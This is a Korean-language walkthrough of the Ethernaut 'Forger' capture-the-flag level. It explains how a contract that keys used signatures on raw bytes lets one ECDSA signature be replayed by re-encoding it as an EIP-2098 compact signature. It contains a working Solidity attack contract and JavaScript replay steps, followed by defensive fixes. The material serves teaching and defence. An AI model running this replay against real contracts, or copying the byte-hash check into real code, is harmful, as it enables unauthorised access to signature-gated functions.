# Ethernaut Level 39 - Forger

## 문제 설명

서명 기반 접근 제어를 사용하는 컨트랙트에서,
**EIP-2098 Compact Signature**를 이용해 이미 사용된 서명을 재사용하는 것이 목표이다.

핵심 키워드: **Digital Signature Encoding, EIP-2098 Compact Signature**

---

## 배경 지식: EIP-2098 Compact Signature

### 표준 ECDSA 서명 (65 bytes)

```
서명 = r (32 bytes) + s (32 bytes) + v (1 byte) = 65 bytes
v = 27 또는 28
```

### EIP-2098 Compact 서명 (64 bytes)

v를 s의 최상위 비트에 인코딩하여 64 bytes로 줄인 형식:

```
compact = r (32 bytes) + vs (32 bytes) = 64 bytes

vs 구성:
  - 최상위 비트 (bit 255): yParity (v - 27 = 0 또는 1)
  - 나머지 255 비트:        s 값

디코딩:
  s       = vs & 0x7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
  yParity = vs >> 255
  v       = yParity + 27
```

### 두 형식은 동일한 서명을 나타냄

```
표준: (r, s, v=27)    ↔ Compact: (r, vs = s | 0x0000...0000)
표준: (r, s, v=28)    ↔ Compact: (r, vs = s | 0x8000...0000)
```

---

## 컨트랙트 분석

```solidity
contract Forger {
    mapping(bytes32 => bool) public usedSignatures;
    address public owner;
    bool public unlocked;

    function unlock(bytes memory signature) external {
        // 서명 사용 여부 확인 (bytes 해시로 체크)
        bytes32 sigHash = keccak256(signature);
        require(!usedSignatures[sigHash], "Signature already used");

        // 서명으로 owner 복구
        address recovered = ECDSA.recover(messageHash, signature);
        require(recovered == owner, "Invalid signature");

        // 서명 무효화
        usedSignatures[sigHash] = true;
        unlocked = true;
    }
}
```

---

## 취약점 분석

### usedSignatures의 키: bytes 해시

```solidity
bytes32 sigHash = keccak256(signature);
usedSignatures[sigHash] = true;
```

사용된 서명의 **bytes 표현을 해시**하여 무효화한다.

### 핵심: 65-byte 서명과 64-byte Compact 서명은 다른 해시

동일한 서명 `(r, s, v)`를 두 가지 방식으로 인코딩하면:

```
65-byte: abi.encodePacked(r, s, v)
→ keccak256 = 0xAAAA...

64-byte compact: abi.encodePacked(r, vs)  (vs = s | yParity << 255)
→ keccak256 = 0xBBBB...  (전혀 다른 해시!)
```

`ECDSA.recover()`는 **두 형식을 모두 지원**한다:
- 65 bytes → 표준 방식으로 복구
- 64 bytes → EIP-2098 방식으로 복구

즉, **같은 서명을 두 가지 인코딩으로 전달하면 두 번 사용 가능**하다!

### 공격 흐름

```
1. 표준 서명(65 bytes)으로 unlock() 호출
   → usedSignatures[keccak256(65bytes)] = true
   → unlocked = true (하지만 우리가 원하는 추가 작업 필요)

2. Compact 서명(64 bytes)으로 다시 unlock() 호출
   → keccak256(64bytes) ≠ keccak256(65bytes)
   → usedSignatures 체크 통과!
   → ECDSA.recover()가 동일한 owner 복구
   → 두 번째 실행 성공
```

---

## EIP-2098 변환 코드

### Solidity (공격 컨트랙트)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IForger {
    function unlock(bytes memory signature) external;
    function usedSignatures(bytes32) external view returns (bool);
}

contract ForgerAttack {
    IForger public target;

    constructor(address _target) {
        target = IForger(_target);
    }

    function toCompact(bytes memory sig65) public pure returns (bytes memory) {
        require(sig65.length == 65, "Not 65 bytes");

        bytes32 r;
        bytes32 s;
        uint8 v;

        assembly {
            r := mload(add(sig65, 0x20))
            s := mload(add(sig65, 0x40))
            v := byte(0, mload(add(sig65, 0x60)))
        }

        // yParity = v - 27 (0 또는 1)
        uint8 yParity = v - 27;

        // vs = s | (yParity << 255)
        bytes32 vs = bytes32(uint256(s) | (uint256(yParity) << 255));

        return abi.encodePacked(r, vs);
    }

    function attack(bytes memory sig65) external {
        // 1. 표준 서명으로 첫 번째 호출
        target.unlock(sig65);

        // 2. Compact 서명으로 두 번째 호출 (다른 bytes → 다른 해시)
        bytes memory sig64 = toCompact(sig65);
        target.unlock(sig64);
    }
}
```

### JavaScript (콘솔)

```js
// 기존 65-byte 서명 (이벤트 또는 배포 트랜잭션에서 추출)
let sig65 = "0x" + r + s + v  // 65 bytes

// v 추출
let vInt = parseInt(sig65.slice(-2), 16)  // 27 또는 28
let yParity = vInt - 27  // 0 또는 1

// s 추출
let sBig = BigInt("0x" + sig65.slice(66, 130))

// vs = s | (yParity << 255)
let vs = sBig | (BigInt(yParity) << 255n)
let vsHex = vs.toString(16).padStart(64, '0')

// Compact 서명 (64 bytes)
let sig64 = "0x" + sig65.slice(2, 66) + vsHex  // r + vs

console.log("65-byte sig:", sig65)
console.log("64-byte sig:", sig64)
```

---

## 공격 단계

### Step 1 — 원본 서명 수집

```js
// 배포 이벤트 또는 트랜잭션에서 owner의 서명 추출
let sig65 = "0x..."  // 65 bytes 서명
```

### Step 2 — Compact 서명 생성

```js
let r = sig65.slice(0, 66)
let s = sig65.slice(66, 130)
let v = parseInt(sig65.slice(130, 132), 16)

let yParity = v - 27
let sBig = BigInt("0x" + s)
let vs = (sBig | (BigInt(yParity) << 255n)).toString(16).padStart(64, '0')

let sig64 = "0x" + r.slice(2) + vs  // 64 bytes
```

### Step 3 — 두 번 호출

```js
// 첫 번째: 65-byte 표준 서명
await contract.unlock(sig65)

// 두 번째: 64-byte Compact 서명 (다른 해시 → 재사용 가능)
await contract.unlock(sig64)
```

### Step 4 — 확인

```js
await contract.unlocked()
// → true

// usedSignatures 확인
let hash65 = web3.utils.keccak256(sig65)
let hash64 = web3.utils.keccak256(sig64)
console.log(hash65 === hash64)  // false → 서로 다른 키!
await contract.usedSignatures(hash65)  // true
await contract.usedSignatures(hash64)  // true (두 번 사용됨)
```

---

## 핵심 교훈

### 서명 포맷 표준화의 중요성

```solidity
// ❌ 위험 - bytes 전체를 해시로 사용
bytes32 sigHash = keccak256(signature);
usedSignatures[sigHash] = true;
// → 65-byte와 64-byte가 다른 해시 → 동일 서명 두 번 사용 가능

// ✅ 안전 방법 1 - (r, s, v)로 정규화 후 해시
(bytes32 r, bytes32 s, uint8 v) = splitSignature(signature);
bytes32 sigHash = keccak256(abi.encodePacked(r, s, v));

// ✅ 안전 방법 2 - 복구된 주소 + nonce 조합 사용
// nonce를 사용해 재사용 방지
mapping(address => uint256) public nonces;
```

### EIP-2098이 도입한 새로운 공격 표면

| 형식 | 크기 | keccak256 |
|---|---|---|
| 표준 (r, s, v) | 65 bytes | 0xAAAA... |
| Compact (r, vs) | 64 bytes | 0xBBBB... |

동일한 서명이지만 **bytes 표현이 달라** 해시가 다르다.

- `ECDSA.recover()`는 두 형식 모두 지원
- `keccak256(signature)`는 형식에 따라 다른 값 반환
- 이 불일치가 서명 재사용 공격의 핵심

### OpenZeppelin의 수정 이력

과거 OZ `ECDSA.sol`에서도 유사한 취약점이 존재했었다.
`tryRecover()`에서 64-byte 서명을 지원하면서 usedSignatures 체크를 bytes 기반으로 하면
동일 서명의 재사용이 가능했다. 현재는 수정됨.

```solidity
// ✅ 올바른 무효화 - 정규화된 (r, s, v) 기반
bytes32 sigHash = keccak256(abi.encodePacked(r, s, v));
// 어떤 인코딩으로 들어와도 동일한 해시 생성
```
